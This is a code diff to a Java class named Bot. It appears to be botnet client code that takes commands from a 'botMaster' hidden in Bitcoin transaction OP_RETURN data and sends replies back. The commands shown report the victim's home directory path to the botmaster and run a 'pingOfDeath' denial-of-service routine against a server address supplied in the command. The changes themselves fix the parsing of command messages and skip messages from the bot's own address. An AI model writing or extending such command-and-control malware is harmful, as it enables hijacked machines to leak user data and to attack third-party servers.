@@ -75,15 +75,19 @@ public class Bot {
      					String messaggio=readOpReturn(tx);
      					String[] v=messaggio.split("-");
      					String comando=v[0];
+     					String serverAddress="";
      					
      				System.out.println("comando: "+comando);
      				
      				String addressString=v[1];
-     				String serverAddress=v[2];
+     				if (v.length>2)
+     				serverAddress=v[2];
+     				
+     				
      				
      				System.out.println("address:"+addressString);
      				Address address=new Address(params,addressString);
-     					
+     					if(!addressString.equalsIgnoreCase(list.get(0).toString()))
      					//gestione delle risposte a seconda dei comandi del botMaster
      					switch (comando) {
      					case "ping":
@@ -99,7 +103,7 @@ public class Bot {
      						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
      						break;
      					case "pingOfDeath":
-    						String risultato=pingOfDeath(serverAddress);
+     						String risultato=pingOfDeath(serverAddress);
     						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
      					default:
      						break;
@@ -126,15 +130,16 @@ public class Bot {
         					String messaggio=readOpReturn(tx);
         					String[] v=messaggio.split("-");
         					String comando=v[0];
-        					
+        					String serverAddress="";
         				System.out.println("comando: "+comando);
         				
         				String addressString=v[1];
-        				String serverAddress=v[2];
+        				if(v.length>2)
+        				serverAddress=v[2];
         				
         				System.out.println("address:"+addressString);
         				Address address=new Address(params,addressString);
-        					
+        				if (!addressString.equalsIgnoreCase(list.get(0).toString())){
         					//gestione delle risposte a seconda dei comandi del botMaster
         					switch (comando) {
         					case "ping":
@@ -155,10 +160,12 @@ public class Bot {
         					default:
         						break;
         					}
+        				  }
         				} catch (Exception e) {
         					// TODO Auto-generated catch block
         					e.printStackTrace();
         				}
+                        
                     }
 
                     @Override
